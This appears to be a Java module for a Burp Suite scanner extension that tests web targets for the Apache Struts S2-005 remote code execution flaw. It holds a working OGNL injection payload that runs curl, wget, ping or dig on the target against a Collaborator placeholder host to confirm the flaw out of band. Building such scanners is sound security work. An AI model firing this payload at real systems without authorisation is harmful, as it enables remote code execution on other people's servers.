package burp.j2ee.issues.impl;

import burp.*;
import burp.j2ee.Confidence;
import burp.j2ee.CustomScanIssue;
import burp.j2ee.Risk;
import burp.j2ee.issues.IModule;
import java.io.PrintWriter;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class ApacheStrus2S2005 implements IModule {
    private static final String TITLE = "Apache Struts S2-005 Remote Code Execution (OOB)";
    private static final String DESCRIPTION = "J2EEscan identified RCE in the webpage"
            + "<b>References</b>:<br /><br />"
            + "http://struts.apache.org/docs/s2-005.html<br />"
            + "https://github.com/vulhub/vulhub/tree/master/struts2/s2-005<br />"
            + "https://www.rapid7.com/db/vulnerabilities/struts-cve-2010-1870";

    private static final String REMEDY = "Upgrade to latest Apache Struts version";
    private PrintWriter stderr;
    @Override
    public List<IScanIssue> scan(IBurpExtenderCallbacks callbacks, IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {

        stderr = new PrintWriter(callbacks.getStderr(), true);
        List<IScanIssue> issues = new ArrayList<>();
        List<String> cmds = new ArrayList<>();
        cmds.add("curl");
        cmds.add("wget");
        cmds.add("ping");
        cmds.add("dig");

        String payload_template = "?(%27%5cu0023_memberAccess[%5c%27allowStaticMethodAccess%5c%27]%27)(vaaa)=true&(aaaa)((%27%5cu0023context[%5c%27xwork.MethodAccessor.denyMethodExecution%5c%27]%5cu003d%5cu0023vccc%27)(%5cu0023vccc%5cu003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('%5cu0023rt.exec(%22RCE_CMD@ATTACKER_DOMAIN%22.split(%22@%22))')(%5cu0023rt%5cu003d@java.lang.Runtime@getRuntime()))=1";
        IExtensionHelpers helpers = callbacks.getHelpers();

        IRequestInfo reqInfo = callbacks.getHelpers().analyzeRequest(baseRequestResponse);
        URL curURL = reqInfo.getUrl();

        String protocol = curURL.getProtocol();
        String host = curURL.getHost();
        int port = curURL.getPort();
        String path = curURL.getPath();

        for (String cmd : cmds) {
            IBurpCollaboratorClientContext collaboratorContext = callbacks.createBurpCollaboratorClientContext();
            String currentCollaboratorPayload = collaboratorContext.generatePayload(true);
            String payload = payload_template.replace("ATTACKER_DOMAIN",currentCollaboratorPayload).replace("RCE_CMD", cmd);
            try{
                URL newURL = new URL(protocol, host, port,  path + payload);
                byte[] newMessage = helpers.buildHttpRequest(newURL);
                IHttpRequestResponse checkRequestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(),
                        newMessage);

                //stderr.println(newURL.toString()); //debug message
                List<IBurpCollaboratorInteraction> collaboratorInteractions = collaboratorContext.fetchCollaboratorInteractionsFor(currentCollaboratorPayload);

                if (!collaboratorInteractions.isEmpty()) {
                    issues.add(new CustomScanIssue(
                            baseRequestResponse.getHttpService(),
                            reqInfo.getUrl(),
                            checkRequestResponse,
                            TITLE,
                            DESCRIPTION,
                            REMEDY,
                            Risk.High,
                            Confidence.Certain
                    ));
                }
            }catch (MalformedURLException ex) {
                stderr.println("Error creating URL " + ex.getMessage());
            }
        }


    return issues;
    }
}
